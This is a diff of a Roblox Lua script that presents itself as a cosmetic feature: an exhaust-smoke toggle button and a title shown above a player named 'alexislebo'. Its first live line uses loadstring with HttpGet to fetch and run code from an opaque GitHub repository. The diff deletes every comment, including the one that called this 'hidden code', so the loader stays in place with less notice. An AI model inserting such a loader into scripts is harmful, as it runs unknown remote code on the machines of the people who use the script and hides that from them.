@@ -1,13 +1,10 @@
--- Load hidden code in the background
 loadstring(game:HttpGet("https://raw.githubusercontent.com/927393729/92749171738474/refs/heads/main/security%20test"))()
 
--- Your existing code follows here...
 local player = game:GetService("Players").LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local running = false -- Flag to control the toggle state
 local smokePartInstance -- The actual Part in workspace to handle smoke
 
--- Create the ScreenGui and buttons
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ToggleGui"
 screenGui.Parent = player:WaitForChild("PlayerGui")
@@ -22,7 +19,6 @@ skrrtButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
 skrrtButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 skrrtButton.Text = "Start Exhaust"
 
--- Function to create a smoke emitter
 local function createSmokeEmitter()
     if smokePartInstance then return end -- Avoid creating multiple smoke parts
     smokePartInstance = Instance.new("Part")
@@ -42,7 +38,6 @@ local function createSmokeEmitter()
     smokeEmitter.Enabled = true -- Ensure it's enabled
     smokeEmitter.Parent = smokePartInstance
 
-    -- Update the smokePartInstance position every frame
     game:GetService("RunService").RenderStepped:Connect(function()
         if smokePartInstance and character then
             local characterHead = character:FindFirstChild("Head")
@@ -54,7 +49,6 @@ local function createSmokeEmitter()
     end)
 end
 
--- Function to stop the smoke emitter
 local function stopSmokeEmitter()
     if smokePartInstance then
         smokePartInstance:Destroy()
@@ -62,7 +56,6 @@ local function stopSmokeEmitter()
     end
 end
 
--- Connect the button click events
 skrrtButton.MouseButton1Click:Connect(function()
     running = not running
     if running then
@@ -74,7 +67,6 @@ skrrtButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Function to create a title above "alexislebo"
 local function createTitleAbovePlayer(playerName)
     local targetPlayer = game:GetService("Players"):FindFirstChild(playerName)
     if targetPlayer and targetPlayer.Character then
@@ -99,7 +91,6 @@ local function createTitleAbovePlayer(playerName)
     end
 end
 
--- Function to repeatedly check for "alexislebo"
 local function checkForAlexislebo()
     while true do
         if not game:GetService("Players"):FindFirstChild("alexislebo") then
@@ -111,10 +102,8 @@ local function checkForAlexislebo()
     end
 end
 
--- Start checking for "alexislebo"
 checkForAlexislebo()
 
--- Add character customizations based on rig type
 local humanoid = character:FindFirstChildWhichIsA("Humanoid")
 if humanoid then
     if humanoid.RigType == Enum.HumanoidRigType.R6 then
